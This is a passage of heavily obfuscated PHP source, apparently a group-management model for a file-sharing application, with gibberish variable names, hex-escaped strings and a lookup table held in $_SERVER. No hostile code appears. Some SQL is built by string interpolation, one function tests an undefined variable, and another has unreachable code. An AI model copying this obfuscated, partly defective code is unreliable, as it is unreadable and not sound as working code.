<?php
 goto BåòøÑÃ«ê; fã©–÷”¿£: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\x65" => "\147\x72\x6f\165\160\x5f\155\145\x74\x61", "\155\145\x74\141\x46\x69\x65\154\144" => "\147\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($ş”) { $­¼’Ë¤ =& $_SERVER[É¨™èà]; return array($­¼’Ë¤[2081] => array($ş”[0], $­¼’Ë¤[2082]), $­¼’Ë¤[2083] => array($ş”[0], $­¼’Ë¤[2084])); } protected function getInfo($¥Ïàšº¥, $ÑÂàóòš = false) { $ œôÜˆ = $this->getInfoSimple($¥Ïàšº¥); if (!$ œôÜˆ) { return !1; } if ($ÑÂàóòš) { return $this->_listDataApplyItem($ œôÜˆ); } return $this->cacheFunctionGet($_SERVER[É¨™èà][2085], $¥Ïàšº¥); } protected function getInfoSimple($Ã–ëÒù¶, $Ï¦Ğôö  = false) { $Ç†¥Ì¸§ =& $_SERVER[É¨™èà]; if ($Ï¦Ğôö ) { $û­§µí¨ = array($Ç†¥Ì¸§[1410] => intval($Ã–ëÒù¶)); $Îéıªï’ = $this->where($û­§µí¨)->find(); return is_array($Îéıªï’) ? $Îéıªï’ : array(); } return $this->cacheFunctionGet($Ç†¥Ì¸§[2086], $Ã–ëÒù¶); } protected function groupAdd($±éøÔÑô) { $Êà’¸óü =& $_SERVER[É¨™èà]; if (!$±éøÔÑô[$Êà’¸óü[193]] && isset($±éøÔÑô[$Êà’¸óü[1410]]) && $±éøÔÑô[$Êà’¸óü[1410]] == 1) { if ($§ğÁ‘×Õ = $this->getInfoSimple($±éøÔÑô[$Êà’¸óü[1410]], !0)) { return $±éøÔÑô[$Êà’¸óü[1410]]; } } else { $§ğÁ‘×Õ = $this->getInfoSimple($±éøÔÑô[$Êà’¸óü[193]]); if (!$§ğÁ‘×Õ) { return !1; } } $“ã±ìºİ = $Êà’¸óü[605]; if ($§ğÁ‘×Õ[$Êà’¸óü[596]]) { $“ã±ìºİ = $§ğÁ‘×Õ[$Êà’¸óü[596]] . $§ğÁ‘×Õ[$Êà’¸óü[1410]] . $Êà’¸óü[50]; } $üãœûÊ† = array($Êà’¸óü[504] => $this->groupNameAuto($±éøÔÑô[$Êà’¸óü[193]], $±éøÔÑô[$Êà’¸óü[32]]), $Êà’¸óü[487] => $±éøÔÑô[$Êà’¸óü[193]], $Êà’¸óü[667] => $“ã±ìºİ, $Êà’¸óü[2087] => $±éøÔÑô[$Êà’¸óü[1986]], $Êà’¸óü[2088] => 0, $Êà’¸óü[2003] => 0); $±éøÔÑô[$Êà’¸óü[32]] = $üãœûÊ†[$Êà’¸óü[32]]; if (isset($±éøÔÑô[$Êà’¸óü[2023]])) { $üãœûÊ†[$Êà’¸óü[2023]] = $±éøÔÑô[$Êà’¸óü[2023]]; } else { $ıÈ†ã÷‰ = $this->max($Êà’¸óü[2023]); if (!$ıÈ†ã÷‰) { $ıÈ†ã÷‰ = 0; } $üãœûÊ†[$Êà’¸óü[2023]] = $ıÈ†ã÷‰ + 1; } if (!empty($±éøÔÑô[$Êà’¸óü[1410]])) { $üãœûÊ†[$Êà’¸óü[1410]] = $±éøÔÑô[$Êà’¸óü[1410]]; } $ÒÍïùú– = $this->add($üãœûÊ†); $this->groupMetaEdit($ÒÍïùú–, $±éøÔÑô); Model($Êà’¸óü[1448])->groupRootAdd($ÒÍïùú–); $this->_clearCache($±éøÔÑô[$Êà’¸óü[193]]); return $ÒÍïùú–; } protected function groupEdit($ËÃ°ÇİÉ, $áÛáåóü) { $®™µ¿œÇ =& $_SERVER[É¨™èà]; $‘Â’Î¯± = $this->getInfoSimple($ËÃ°ÇİÉ); if (!$‘Â’Î¯±) { return !1; } if (!empty($áÛáåóü[$®™µ¿œÇ[193]])) { $¡ğÛ»¬ = $this->getInfoSimple($áÛáåóü[$®™µ¿œÇ[193]]); if (!$¡ğÛ»¬) { return !1; } if ($‘Â’Î¯±[$®™µ¿œÇ[1410]] == $¡ğÛ»¬[$®™µ¿œÇ[1410]]) { return !1; } if ($áÛáåóü[$®™µ¿œÇ[193]] != $‘Â’Î¯±[$®™µ¿œÇ[193]]) { if ($¡ğÛ»¬[$®™µ¿œÇ[596]] !== $‘Â’Î¯±[$®™µ¿œÇ[596]] && strpos($¡ğÛ»¬[$®™µ¿œÇ[596]], $‘Â’Î¯±[$®™µ¿œÇ[596]] . $‘Â’Î¯±[$®™µ¿œÇ[1410]] . $®™µ¿œÇ[50]) === 0) { return !1; } $áÛáåóü[$®™µ¿œÇ[667]] = $¡ğÛ»¬[$®™µ¿œÇ[596]] . $áÛáåóü[$®™µ¿œÇ[193]] . $®™µ¿œÇ[50]; $this->_changeChildLevel($‘Â’Î¯±, $¡ğÛ»¬); $this->_clearCache($¡ğÛ»¬[$®™µ¿œÇ[1410]]); $this->_clearCache($‘Â’Î¯±[$®™µ¿œÇ[193]]); } } $this->groupMetaEdit($ËÃ°ÇİÉ, $áÛáåóü); $this->_clearChildrenCache($‘Â’Î¯±); return $this->where(array($®™µ¿œÇ[2089] => $ËÃ°ÇİÉ))->save($áÛáåóü); } private function groupMetaEdit($¢öİø¯£, &$ç¾ ½Ñ‡) { $Œ»«’‹² =& $_SERVER[É¨™èà]; if (isset($ç¾ ½Ñ‡[$Œ»«’‹²[32]])) { $this->setNamePinyin($¢öİø¯£, $ç¾ ½Ñ‡[$Œ»«’‹²[32]]); } if (isset($ç¾ ½Ñ‡[$Œ»«’‹²[2090]])) { $·©–¦£ = array($Œ»«’‹²[2090] => $ç¾ ½Ñ‡[$Œ»«’‹²[2090]], $Œ»«’‹²[2091] => $ç¾ ½Ñ‡[$Œ»«’‹²[2091]]); unset($ç¾ ½Ñ‡[$Œ»«’‹²[2090]]); unset($ç¾ ½Ñ‡[$Œ»«’‹²[2091]]); if (isset($ç¾ ½Ñ‡[$Œ»«’‹²[2092]])) { $ü¦††–” = $Œ»«’‹²[1406] . $¢öİø¯£; $«ø×ğÌ‹ = $Œ»«’‹²[1405]; $µù•Ëí„ = $ç¾ ½Ñ‡[$Œ»«’‹²[2092]] ? $ç¾ ½Ñ‡[$Œ»«’‹²[2092]] : $Œ»«’‹²[12]; $«ƒò†Ë = Model($Œ»«’‹²[1404])->get($ü¦††–”, $«ø×ğÌ‹); $«ƒò†Ë = $«ƒò†Ë ? $«ƒò†Ë : $Œ»«’‹²[12]; if ($«ƒò†Ë != $µù•Ëí„) { if (!$µù•Ëí„ && $«ƒò†Ë) { Model($Œ»«’‹²[1404])->remove($ü¦††–”, $«ø×ğÌ‹); } else { if ($µù•Ëí„) { Model($Œ»«’‹²[1404])->set($ü¦††–”, $µù•Ëí„, $«ø×ğÌ‹); } } } $·©–¦£[$Œ»«’‹²[2092]] = $µù•Ëí„; } $this->metaSet($¢öİø¯£, $·©–¦£); } } private function _clearChildrenCache($š€şĞòà) { $éŒäç¦º =& $_SERVER[É¨™èà]; $şóŞ†‘ñ = array($éŒäç¦º[667] => array($éŒäç¦º[627], $š€şĞòà[$éŒäç¦º[596]] . $š€şĞòà[$éŒäç¦º[1410]] . $éŒäç¦º[628])); $òÕÁöÇõ = $this->field($éŒäç¦º[1410])->where($şóŞ†‘ñ)->select(); foreach ($òÕÁöÇõ as $ìµƒıÅ©) { $this->_clearCache($ìµƒıÅ©[$éŒäç¦º[1410]]); } } private function _clearCache($×ÓÕìËø) { $µÇ×½’— =& $_SERVER[É¨™èà]; $this->cacheFunctionClear($µÇ×½’—[2085], $×ÓÕìËø); $this->cacheFunctionClear($µÇ×½’—[2086], $×ÓÕìËø); } private function _changeChildLevel($¡‰ˆçÄ–, $Ô…ü™¿è, $é”ÖµÛ = false) { $õŠ“ÎØµ =& $_SERVER[É¨™èà]; $–°¿¾ÆÇ = $¡‰ˆçÄ–[$õŠ“ÎØµ[596]] . $¡‰ˆçÄ–[$õŠ“ÎØµ[1410]] . $õŠ“ÎØµ[50]; $ãØ€äÑü = $Ô…ü™¿è[$õŠ“ÎØµ[596]] . $Ô…ü™¿è[$õŠ“ÎØµ[1410]] . $õŠ“ÎØµ[50] . $¡‰ˆçÄ–[$õŠ“ÎØµ[1410]] . $õŠ“ÎØµ[50]; if ($é”ÖµÛ) { $ãØ€äÑü = $Ô…ü™¿è[$õŠ“ÎØµ[596]] . $Ô…ü™¿è[$õŠ“ÎØµ[1410]] . $õŠ“ÎØµ[50]; } $ „çßé = array($õŠ“ÎØµ[667] => array($õŠ“ÎØµ[627], $¡‰ˆçÄ–[$õŠ“ÎØµ[596]] . $¡‰ˆçÄ–[$õŠ“ÎØµ[1410]] . $õŠ“ÎØµ[628])); $ãÑÓÒ‹ô = array($õŠ“ÎØµ[667] => array($õŠ“ÎØµ[676], "\x72\145\x70\x6c\x61\x63\x65\x28\x70\x61\162\x65\x6e\164\114\145\x76\145\154\x2c\x27{$–°¿¾ÆÇ}\47\x2c\x27{$ãØ€äÑü}\x27\51")); $this->_clearChildrenCache($¡‰ˆçÄ–); $this->where($ „çßé)->data($ãÑÓÒ‹ô)->save(); } public function setNamePinyin($¥‡†ì€¦, $âÒ“ëŞ‹ = false) { $ôŞüƒÔÃ =& $_SERVER[É¨™èà]; if (!$âÒ“ëŞ‹) { $„ä…İ‚Ü = $this->getInfoSimple($¥‡†ì€¦); $âÒ“ëŞ‹ = $„ä…İ‚Ü[$ôŞüƒÔÃ[32]]; } if (!Input::check($âÒ“ëŞ‹, $ôŞüƒÔÃ[670])) { $this->metaSet($¥‡†ì€¦, $ôŞüƒÔÃ[548], null); $this->metaSet($¥‡†ì€¦, $ôŞüƒÔÃ[547], null); return; } $µÒ³Ôö» = array($ôŞüƒÔÃ[548] => str_replace($ôŞüƒÔÃ[53], $ôŞüƒÔÃ[12], Pinyin::get($âÒ“ëŞ‹)), $ôŞüƒÔÃ[547] => Pinyin::get($âÒ“ëŞ‹, $ôŞüƒÔÃ[671])); $this->metaSet($¥‡†ì€¦, $µÒ³Ôö»); } protected function metaSet($º¼³Øœ, $Àœß†Ú‚ = null, $Æ¥À…¬Ö = null) { $this->_clearCache($º¼³Øœ); return parent::metaSet($º¼³Øœ, $Àœß†Ú‚, $Æ¥À…¬Ö); } protected function groupStatus($××ü³ÏÒ, $ô¥Çê•À) { $‘Ç»“ô¬ =& $_SERVER[É¨™èà]; $‡©ì¬‚ç = $this->getInfoSimple($××ü³ÏÒ); if (!$‡©ì¬‚ç) { return !1; } $this->_clearCache($××ü³ÏÒ); return $this->metaSet($××ü³ÏÒ, $‘Ç»“ô¬[840], $ô¥Çê•À); if ($ô¥Çê•À == $‘Ç»“ô¬[91]) { $ıÁå³¾Û = $this->parentLevelArray($‡©ì¬‚ç[$‘Ç»“ô¬[596]]); } else { } $ıÁå³¾Û[] = $‡©ì¬‚ç[$‘Ç»“ô¬[1410]]; $¨«–Óâ¥ = array(); foreach ($ıÁå³¾Û as $××ü³ÏÒ) { $¨«–Óâ¥[] = array($‘Ç»“ô¬[1410] => $××ü³ÏÒ, $‘Ç»“ô¬[97] => $‘Ç»“ô¬[840], $‘Ç»“ô¬[461] => $ô¥Çê•À); $this->_clearCache($××ü³ÏÒ); } return Model($‘Ç»“ô¬[2093])->addAll($¨«–Óâ¥, array(), !0); } protected function groupRemove($¢”‡›š, $ãÉØ«•Ú = false) { $ù†ò°Ë =& $_SERVER[É¨™èà]; $ç•ö«„® = array($ù†ò°Ë[1410] => $¢”‡›š); $ÕÑ­Ÿ¨¹ = $this->where($ç•ö«„®)->find(); if (!$ÕÑ­Ÿ¨¹ || $ÕÑ­Ÿ¨¹[$ù†ò°Ë[193]] == 0) { return !1; } if (!$ãÉØ«•Ú) { $Ÿè«‚şë = $this->getInfoSimple($ÕÑ­Ÿ¨¹[$ù†ò°Ë[193]]); $this->_changeChildLevel($ÕÑ­Ÿ¨¹, $Ÿè«‚şë, !0); $this->where(array($ù†ò°Ë[193] => $¢”‡›š))->save(array($ù†ò°Ë[193] => $ÕÑ­Ÿ¨¹[$ù†ò°Ë[193]])); $this->_clearCache($Ÿè«‚şë[$ù†ò°Ë[1410]]); } Model($ù†ò°Ë[2093])->where($ç•ö«„®)->delete(); Model($ù†ò°Ë[2094])->where($ç•ö«„®)->delete(); Model($ù†ò°Ë[921])->groupRootRemove($¢”‡›š); $this->_clearCache($ÕÑ­Ÿ¨¹[$ù†ò°Ë[193]]); return $this->where($ç•ö«„®)->delete(); } protected function groupSort($Ìï¹¿®š) { $Ìƒ°Œâ· =& $_SERVER[É¨™èà]; $±Åı‘‹Ë = array(); foreach ($Ìï¹¿®š as $‘¦œ¿æ => $»ëÁˆ®Â) { $±Åı‘‹Ë[] = array($Ìƒ°Œâ·[1410], $»ëÁˆ®Â, $Ìƒ°Œâ·[2023], $‘¦œ¿æ + 1); } $this->saveAll($±Åı‘‹Ë); } public function listData() { $Â¹áæ’Õ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Â¹áæ’Õ[$_SERVER[É¨™èà][456]]); return $Â¹áæ’Õ; } private function _makeOrder($à§ü‚â† = '') { $ñ‡¸¿µ² =& $_SERVER[É¨™èà]; $³†ÉÆÎÏ = array($ñ‡¸¿µ²[1410], $ñ‡¸¿µ²[32], $ñ‡¸¿µ²[1988], $ñ‡¸¿µ²[234]); $Å”Œí¢ = array($ñ‡¸¿µ²[533] => $ñ‡¸¿µ²[534], $ñ‡¸¿µ²[535] => $ñ‡¸¿µ²[536]); $±ßû©õÆ = Input::get($ñ‡¸¿µ²[540], $ñ‡¸¿µ²[7], $ñ‡¸¿µ²[2003], $³†ÉÆÎÏ); $ã‰áëûÙ = Input::get($ñ‡¸¿µ²[541], $ñ‡¸¿µ²[7], $ñ‡¸¿µ²[2095], array($ñ‡¸¿µ²[2095], $ñ‡¸¿µ²[535])); $ã‰áëûÙ = $Å”Œí¢[$ã‰áëûÙ]; $à§ü‚â† = $à§ü‚â† . "{$±ßû©õÆ}\40{$ã‰áëûÙ}\x2c\40\147\162\x6f\x75\x70\111\x44\40\141\x73\x63"; return $this->order($à§ü‚â†); } public function listChild($ÖªëÛ€) { $­ÃŒ«‹³ =& $_SERVER[É¨™èà]; $›µÁØú€ = $this->where(array($­ÃŒ«‹³[193] => $ÖªëÛ€))->_makeOrder()->selectPage(200); $this->_listDataApply($›µÁØú€[$­ÃŒ«‹³[456]]); return $›µÁØú€; } public function listChildIds($Ü§ÒöéÅ) { $µ½” “¼ =& $_SERVER[É¨™èà]; if (is_string($¡ÄÖŞÇ†)) { $Ü§ÒöéÅ = explode($µ½” “¼[50], $Ü§ÒöéÅ); } $˜¦©«— = $this->where(array($µ½” “¼[1410] => array($µ½” “¼[7], $Ü§ÒöéÅ)))->field($µ½” “¼[2096])->select(); if (!$˜¦©«—) { return !1; } $õ×²à™« = array(); foreach ($˜¦©«— as $¿»œåìä) { $õ×²à™«[] = "\x73\145\154\145\143\x74\40\x67\x72\x6f\165\160\x49\x44\x20\146\x72\157\x6d\40\x60\x67\162\x6f\165\x70\x60\40\x77\150\145\x72\x65\x20\160\141\162\x65\156\164\x4c\145\x76\x65\x6c\x20\154\x69\x6b\x65\40\x27{$¿»œåìä[$µ½” “¼[596]]}{$¿»œåìä[$µ½” “¼[1410]]}\x2c\45\47"; } $õ×²à™« = implode($µ½” “¼[2097], $õ×²à™«); $˜¦©«— = $this->query($õ×²à™«); if (!$˜¦©«—) { return array(); } $Ü§ÒöéÅ = array_to_keyvalue($˜¦©«—, $µ½” “¼[12], $µ½” “¼[1410]); return array_unique($Ü§ÒöéÅ); } public function listByID($¤äºøü) { $ë§†©å¯ =& $_SERVER[É¨™èà]; if (!$¤äºøü) { return array(); } $ŸÇ¬àÌ = array($ë§†©å¯[1410] => array($ë§†©å¯[7], $¤äºøü)); $öô©ÙÇó = $this->where($ŸÇ¬àÌ)->select(); $öô©ÙÇó = array_sort_keep($öô©ÙÇó, $ë§†©å¯[1410], $¤äºøü); $this->_listDataApply($öô©ÙÇó); return $öô©ÙÇó; } public function listSearch($Œ¬ú„êî) { $ùûËÃã” =& $_SERVER[É¨™èà]; $—ŸèÌ¨Š = trim($Œ¬ú„êî[$ùûËÃã”[2098]]); $šÁ¡—© = explode($ùûËÃã”[53], $—ŸèÌ¨Š); if (!$—ŸèÌ¨Š || count($šÁ¡—©) == 1) { return $this->listSearchNow($Œ¬ú„êî); } $¹Ûº½îë = array($ùûËÃã”[456] => array()); foreach ($šÁ¡—© as $°ËÄÈ°Ù) { if (!trim($°ËÄÈ°Ù)) { continue; } $Œ¬ú„êî[$ùûËÃã”[2098]] = $°ËÄÈ°Ù; $¾²«à¹¹ = $this->listSearchNow($Œ¬ú„êî); $¹Ûº½îë[$ùûËÃã”[456]] = array_merge($¹Ûº½îë[$ùûËÃã”[456]], $¾²«à¹¹[$ùûËÃã”[456]]); } $¹Ûº½îë[$ùûËÃã”[456]] = array_unique_by_key($¹Ûº½îë[$ùûËÃã”[456]], $ùûËÃã”[1410]); $¹Ûº½îë[$ùûËÃã”[453]] = array($ùûËÃã”[454] => count($¹Ûº½îë[$ùûËÃã”[456]]), $ùûËÃã”[450] => 20, $ùûËÃã”[439] => 1, $ùûËÃã”[455] => 1); return $¹Ûº½îë; } public function listSearchNow($ÕïòõæÕ) { $È°ìöß =& $_SERVER[É¨™èà]; $áªÍ¼ = trim($ÕïòõæÕ[$È°ìöß[2098]]); $èªç¹Óü = isset($ÕïòõæÕ[$È°ìöß[2099]]) ? $ÕïòõæÕ[$È°ìöß[2099]] : !1; if (!trim($áªÍ¼)) { return !1; } $áªÍ¼ = str_replace($È°ìöß[2100], $È°ìöß[2101], $áªÍ¼); $›âƒóÔñ = array($È°ìöß[1410] => array($È°ìöß[469], "{$áªÍ¼}\45"), $È°ìöß[32] => array($È°ìöß[469], "\x25{$áªÍ¼}\x25"), $È°ìöß[1094] => $È°ìöß[2102]); if ($èªç¹Óü) { $øûúˆÙº = $this->getInfoSimple($èªç¹Óü); $û˜â°Áæ = $øûúˆÙº[$È°ìöß[596]] . $èªç¹Óü . $È°ìöß[628]; $›âƒóÔñ = array($›âƒóÔñ, array($È°ìöß[596] => array($È°ìöß[469], $û˜â°Áæ))); } $›âƒóÔñ = $this->parseWhereLike($›âƒóÔñ); $§åœğØ§ = $this->_makeOrder()->where($›âƒóÔñ)->selectPage(20); $§åœğØ§ = $§åœğØ§ ? $§åœğØ§ : array($È°ìöß[456] => array(), $È°ìöß[453] => array()); if (!$§åœğØ§ || count($§åœğØ§[$È°ìöß[456]]) < 5 && Input::check($áªÍ¼, $È°ìöß[404])) { $å‘¸ÅÛ· = $this->groupChildrenAll($èªç¹Óü); $øª†Ù»† = $this->_searchFromMeta($È°ìöß[547], $áªÍ¼, 10, $å‘¸ÅÛ·); $­¡èµÚ  = $this->_searchFromMeta($È°ìöß[548], $áªÍ¼, 10, $å‘¸ÅÛ·); $êµ¸Ùíç = array_merge($øª†Ù»†, $­¡èµÚ , $§åœğØ§[$È°ìöß[456]]); $§åœğØ§[$È°ìöß[456]] = array_unique_by_key($êµ¸Ùíç, $È°ìöß[1410]); $§åœğØ§[$È°ìöß[453]][$È°ìöß[454]] = count($§åœğØ§[$È°ìöß[456]]); $§åœğØ§[$È°ìöß[453]][$È°ìöß[455]] = ceil($§åœğØ§[$È°ìöß[453]][$È°ìöß[454]] / $§åœğØ§[$È°ìöß[453]][$È°ìöß[450]]); } $this->_listDataApply($§åœğØ§[$È°ìöß[456]]); return $§åœğØ§; } protected function groupChildrenAll($Ğ–ŸáÏ™) { $õ´„è¥© =& $_SERVER[É¨™èà]; if (!$Ğ–ŸáÏ™) { return !1; } if (!is_array($Ğ–ŸáÏ™)) { $Ğ–ŸáÏ™ = array($Ğ–ŸáÏ™); } $• Ö£è = $Ğ–ŸáÏ™; foreach ($Ğ–ŸáÏ™ as $Ä´¶´¡•) { $ø¨Ì‰“Ä = $this->getInfoSimple($Ä´¶´¡•); $‰ªÕõ›Ç = array($õ´„è¥©[596] => array($õ´„è¥©[469], $ø¨Ì‰“Ä[$õ´„è¥©[596]] . $Ä´¶´¡• . $õ´„è¥©[628])); $¤¬æå–ê = $this->field($õ´„è¥©[1410])->where($‰ªÕõ›Ç)->select(); $• Ö£è = array_merge($• Ö£è, array_to_keyvalue($¤¬æå–ê, $õ´„è¥©[12], $õ´„è¥©[1410])); } return array_unique($• Ö£è); } private function _searchFromMeta($ºé±ì , $á½å­‚Ë, $¦ü³”‚é, $˜±ÛÉï’) { $ß¦‰”úÖ =& $_SERVER[É¨™èà]; $á½å­‚Ë = strtolower($á½å­‚Ë); $¬ÏÇÆ–€ = array($ß¦‰”úÖ[97] => $ºé±ì , $ß¦‰”úÖ[461] => array($ß¦‰”úÖ[469], "\x25{$á½å­‚Ë}\x25")); $¬ÏÇÆ–€ = $this->parseWhereLike($¬ÏÇÆ–€); if ($˜±ÛÉï’) { $¬ÏÇÆ–€[$ß¦‰”úÖ[1410]] = array($ß¦‰”úÖ[7], $˜±ÛÉï’); } $¾´Ë»ß = Model($ß¦‰”úÖ[2103])->where($¬ÏÇÆ–€)->limit($¦ü³”‚é)->select(); if (!$¾´Ë»ß) { return array(); } $¾´Ë»ß = array_to_keyvalue($¾´Ë»ß, $ß¦‰”úÖ[12], $ß¦‰”úÖ[1410]); $‰ÁÜûº = $this->where(array($ß¦‰”úÖ[2089] => array($ß¦‰”úÖ[7], $¾´Ë»ß)))->select(); if (!$‰ÁÜûº) { return array(); } return $‰ÁÜûº; } protected function _listDataApplyItem($‰ñÃÏ) { $¢§ÃÊë = array($‰ñÃÏ); $this->_listDataApply($¢§ÃÊë); return $¢§ÃÊë[0]; } protected function _listDataApply(&$êÇú¾—¹) { $ÖÚ¿ªîá =& $_SERVER[É¨™èà]; if (!$êÇú¾—¹) { return; } $ÅÔªŸ£ï = array_to_keyvalue($êÇú¾—¹, $ÖÚ¿ªîá[12], $ÖÚ¿ªîá[1410]); $this->_listAppendChildren($êÇú¾—¹); $this->_listAppendChildrenMember($êÇú¾—¹); $this->_listAppendMeta($êÇú¾—¹, $ÅÔªŸ£ï); $this->_listAppendParent($êÇú¾—¹); $this->_listAppendSourceRoot($êÇú¾—¹, $ÅÔªŸ£ï); } private function _listAppendChildren(&$°¬ÄÖù¿) { $„¾Ìàèæ =& $_SERVER[É¨™èà]; $÷Ú¼¬•È = array_to_keyvalue($°¬ÄÖù¿, $„¾Ìàèæ[12], $„¾Ìàèæ[1410]); $ÙÊÍ»ŠÈ = array($„¾Ìàèæ[193] => array($„¾Ìàèæ[7], $÷Ú¼¬•È)); $„¨ó‘»û = array($„¾Ìàèæ[193], $„¾Ìàèæ[2104] => $„¾Ìàèæ[577]); $è­åŠø = $this->field($„¨ó‘»û)->where($ÙÊÍ»ŠÈ)->group($„¾Ìàèæ[193])->select(); $ÅÑ¯Ë„½ = array_to_keyvalue($è­åŠø, $„¾Ìàèæ[193], $„¾Ìàèæ[577]); foreach ($°¬ÄÖù¿ as &$æÀØöµÕ) { $ú¦à„ÑÆ = $æÀØöµÕ[$„¾Ìàèæ[1410]]; $æÀØöµÕ[$„¾Ìàèæ[2105]] = isset($ÅÑ¯Ë„½[$ú¦à„ÑÆ]) ? intval($ÅÑ¯Ë„½[$ú¦à„ÑÆ]) : !1; } unset($æÀØöµÕ); } private function _listAppendChildrenMember(&$Ü›‰ÛõÍ) { $Ã’å²  =& $_SERVER[É¨™èà]; $¯¨æä‰ = array_to_keyvalue($Ü›‰ÛõÍ, $Ã’å² [12], $Ã’å² [1410]); $²›öü‘­ = array($Ã’å² [1410] => array($Ã’å² [7], $¯¨æä‰)); $àï¯İè³ = array($Ã’å² [1410], $Ã’å² [2104] => $Ã’å² [577]); $šİÕ°Ä = Model($Ã’å² [2094])->field($àï¯İè³)->where($²›öü‘­)->group($Ã’å² [1410])->select(); $şÎÚ„²¬ = array_to_keyvalue($šİÕ°Ä, $Ã’å² [1410], $Ã’å² [577]); foreach ($Ü›‰ÛõÍ as &$•®ÇÑ„¡) { $Ã‹ÜÖê = $•®ÇÑ„¡[$Ã’å² [1410]]; $•®ÇÑ„¡[$Ã’å² [2106]] = isset($şÎÚ„²¬[$Ã‹ÜÖê]) ? intval($şÎÚ„²¬[$Ã‹ÜÖê]) : !1; } unset($•®ÇÑ„¡); } private function _listAppendMeta(&$©¼“šÎŞ, $çÚîÒ‰®) { $‚ÛÌ÷ß‚ =& $_SERVER[É¨™èà]; $ì¤§ìëƒ = array($‚ÛÌ÷ß‚[1410] => array($‚ÛÌ÷ß‚[7], $çÚîÒ‰®)); $ÔüªÜÓÍ = Model($‚ÛÌ÷ß‚[2093])->where($ì¤§ìëƒ)->select(); $ÔüªÜÓÍ = array_to_keyvalue_group($ÔüªÜÓÍ, $‚ÛÌ÷ß‚[1410]); foreach ($ÔüªÜÓÍ as &$”®É°™µ) { $”®É°™µ = array_to_keyvalue($”®É°™µ, $‚ÛÌ÷ß‚[97], $‚ÛÌ÷ß‚[461]); } unset($”®É°™µ); foreach ($©¼“šÎŞ as &$ÓÍè¾õÚ) { $ÓÍè¾õÚ[$‚ÛÌ÷ß‚[551]] = array(); if (isset($ÔüªÜÓÍ[$ÓÍè¾õÚ[$‚ÛÌ÷ß‚[1410]]])) { $ÓÍè¾õÚ[$‚ÛÌ÷ß‚[551]] = $ÔüªÜÓÍ[$ÓÍè¾õÚ[$‚ÛÌ÷ß‚[1410]]]; } } unset($ÓÍè¾õÚ); } protected function parentLevelArray($í¯·§Øê) { $¬€ÔÏ‹› =& $_SERVER[É¨™èà]; $í¯·§Øê = explode($¬€ÔÏ‹›[50], trim($í¯·§Øê, $¬€ÔÏ‹›[50])); $í¯·§Øê = array_remove_value($í¯·§Øê, $¬€ÔÏ‹›[231]); return $í¯·§Øê; } protected function parentInGroup($Ø¿ÃòÒŒ, $İ©”±™ª) { $×à°¦Õ÷ =& $_SERVER[É¨™èà]; $–İ—À„· = $this->getInfoSimple($Ø¿ÃòÒŒ); if (!$–İ—À„·) { return !0; } $å­â²Ñ€ = $this->parentLevelArray($–İ—À„·[$×à°¦Õ÷[596]]); $å­â²Ñ€[] = $Ø¿ÃòÒŒ; foreach ($å­â²Ñ€ as $Ø¿ÃòÒŒ) { if (in_array($Ø¿ÃòÒŒ . $×à°¦Õ÷[12], $İ©”±™ª)) { return !0; } } return !1; } private function _listAppendParent(&$õ¡ÊŠ¸­) { $¾ãç­ñ =& $_SERVER[É¨™èà]; $İ¹óŒ—ä = array(); foreach ($õ¡ÊŠ¸­ as &$û‰¹ğœ©) { $İ¹óŒ—ä[$û‰¹ğœ©[$¾ãç­ñ[1410]]] = $û‰¹ğœ©[$¾ãç­ñ[32]]; $ØõÎ ø€ = $this->parentLevelArray($û‰¹ğœ©[$¾ãç­ñ[596]]); foreach ($ØõÎ ø€ as $¯ãõ¹åĞ) { if (!isset($İ¹óŒ—ä[$¯ãõ¹åĞ])) { $İ¹óŒ—ä[$¯ãõ¹åĞ] = 0; } } } unset($û‰¹ğœ©); foreach ($İ¹óŒ—ä as $¥Ù…ı => $İ­úâì) { if ($İ­úâì) { continue; } $Ú‚›ñ‹¯ = $this->getInfoSimple($¥Ù…ı); $İ¹óŒ—ä[$¥Ù…ı] = $Ú‚›ñ‹¯[$¾ãç­ñ[32]]; } $Ç“ƒ·‰Æ = $GLOBALS[$¾ãç­ñ[6]][$¾ãç­ñ[92]][$¾ãç­ñ[2107]]; if (KodUser::isRoot()) { $Ç“ƒ·‰Æ = !1; } foreach ($õ¡ÊŠ¸­ as &$û‰¹ğœ©) { $ØõÎ ø€ = $this->parentLevelArray($û‰¹ğœ©[$¾ãç­ñ[596]]); $Î°”ä©ı = $¾ãç­ñ[12]; foreach ($ØõÎ ø€ as $¥Ù…ı => $¯ãõ¹åĞ) { if ($Ç“ƒ·‰Æ && $¥Ù…ı == 0) { continue; } $Î°”ä©ı .= $İ¹óŒ—ä[$¯ãõ¹åĞ] . $¾ãç­ñ[8]; } if ($ØõÎ ø€) { $Î°”ä©ı .= $û‰¹ğœ©[$¾ãç­ñ[32]]; } $û‰¹ğœ©[$¾ãç­ñ[601]] = str_replace($¾ãç­ñ[257], $¾ãç­ñ[8], $Î°”ä©ı); } unset($û‰¹ğœ©); } private function _listAppendSourceRoot(&$ğúÊö“¦, $ª¬ÃÏÉœ) { $İİÃùú‚ =& $_SERVER[É¨™èà]; $ÓİÎÇ¼ = Model($İİÃùú‚[921])->listSourceRoot(SourceModel::TYPE_GROUP, $ª¬ÃÏÉœ); $ÓİÎÇ¼ = array_to_keyvalue($ÓİÎÇ¼, $İİÃùú‚[581]); $ÓİÎÇ¼ = array_remove_key($ÓİÎÇ¼, $İİÃùú‚[581]); foreach ($ğúÊö“¦ as &$´¨´ßš·) { $´¨´ßš·[$İİÃùú‚[90]] = $ÓİÎÇ¼[$´¨´ßš·[$İİÃùú‚[1410]]] ? $ÓİÎÇ¼[$´¨´ßš·[$İİÃùú‚[1410]]] : array(); } unset($´¨´ßš·); } protected function groupMerge($£¬–¹ëã) { $£¬–¹ëã = array_values(array_unique($£¬–¹ëã)); $ü–¸Õ² = array(); for ($¼¨éÂÀ = 0; $¼¨éÂÀ < count($£¬–¹ëã); $¼¨éÂÀ++) { $¸­Ó›× = !1; for ($ÛÄ§ĞÎ¼ = 0; $ÛÄ§ĞÎ¼ < count($£¬–¹ëã); $ÛÄ§ĞÎ¼++) { if ($¼¨éÂÀ == $ÛÄ§ĞÎ¼) { continue; } if ($this->isParentOf($£¬–¹ëã[$ÛÄ§ĞÎ¼], $£¬–¹ëã[$¼¨éÂÀ])) { $¸­Ó›× = !0; break; } } if (!$¸­Ó›×) { $ü–¸Õ²[] = 